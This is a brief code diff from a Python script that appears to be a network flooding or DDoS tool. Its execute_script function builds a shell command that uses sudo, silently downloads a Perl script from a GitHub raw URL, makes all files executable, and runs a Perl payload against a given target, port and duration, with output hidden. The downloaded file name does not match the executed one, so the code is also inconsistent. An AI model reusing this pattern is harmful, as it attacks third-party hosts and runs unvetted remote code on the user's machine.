@@ -20,8 +20,8 @@ def get_target_info(target):
 
 def execute_script(target, port, duration):
     # Create directory if it doesn't exist
-    if not os.path.exists("/hvr/usr"):
-        os.makedirs("/hvr/usr")
+    if not os.path.exists("../hvr/usr"):
+        os.makedirs("../hvr/usr")
 
     # Silence the wget command by redirecting output to /dev/null
     command = f"sudo timedatectl set-timezone Asia/Kolkata > /dev/null 2>&1 && cd && cd .. && cd hvr && cd usr && wget https://github.com/proxy807010/gaandmaarlungateri/raw/main/SamZGamerz.pl > /dev/null 2>&1 && chmod +x * && perl pyaarkabhukha.pl {target} {port} {duration} 100 rohan123 rohan123 > /dev/null 2>&1"
